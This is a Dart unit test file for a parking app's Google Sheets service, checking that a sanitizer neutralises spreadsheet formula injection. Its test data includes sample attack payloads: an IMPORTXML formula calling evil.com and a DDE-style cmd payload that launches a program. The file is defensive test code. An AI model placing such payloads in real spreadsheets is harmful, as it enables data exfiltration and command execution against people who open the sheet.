import 'package:flutter_test/flutter_test.dart';
import 'package:bssparking_timemark/data/services/google_sheets_service.dart';

void main() {
  group('SEC-08: Formula injection sanitization tests', () {
    test('Prefixes dangerous formula characters with a single quote', () {
      expect(GoogleSheetsService.sanitizeForSheet('=1+1'), "'=1+1");
      expect(GoogleSheetsService.sanitizeForSheet('=SUM(A1:B1)'), "'=SUM(A1:B1)");
      expect(GoogleSheetsService.sanitizeForSheet('=IMPORTXML("http://evil.com","//")'), "'=IMPORTXML(\"http://evil.com\",\"//\")");
      expect(GoogleSheetsService.sanitizeForSheet('+cmd|"/C calc"!A0'), "'+cmd|\"/C calc\"!A0");
      expect(GoogleSheetsService.sanitizeForSheet('-5+2'), "'-5+2");
      expect(GoogleSheetsService.sanitizeForSheet('@SUM(A1)'), "'@SUM(A1)");
      expect(GoogleSheetsService.sanitizeForSheet('\tTABBED_VALUE'), "'\tTABBED_VALUE");
      expect(GoogleSheetsService.sanitizeForSheet('\rCARRIAGE_RETURN'), "'\rCARRIAGE_RETURN");
    });

    test('Leaves safe strings unmodified', () {
      expect(GoogleSheetsService.sanitizeForSheet('Pos Barat (Manado)'), 'Pos Barat (Manado)');
      expect(GoogleSheetsService.sanitizeForSheet('Teknisi BSS 01'), 'Teknisi BSS 01');
      expect(GoogleSheetsService.sanitizeForSheet('✓ CCTV Gate OK'), '✓ CCTV Gate OK');
      expect(GoogleSheetsService.sanitizeForSheet('⚠️ Barrier Gate macet'), '⚠️ Barrier Gate macet');
      expect(GoogleSheetsService.sanitizeForSheet('12345'), '12345');
      expect(GoogleSheetsService.sanitizeForSheet(''), '');
    });

    test('Leaves safe punctuation and non-formula prefixes unmodified', () {
      expect(GoogleSheetsService.sanitizeForSheet('/var/log/syslog'), '/var/log/syslog');
      expect(GoogleSheetsService.sanitizeForSheet('.bashrc'), '.bashrc');
      expect(GoogleSheetsService.sanitizeForSheet('*all*'), '*all*');
      expect(GoogleSheetsService.sanitizeForSheet('#channel'), '#channel');
    });

    test('defaultEndpointUrl points to sheets-sync edge function', () {
      expect(GoogleSheetsService.defaultEndpointUrl, contains('/functions/v1/sheets-sync'));
    });
  });
}
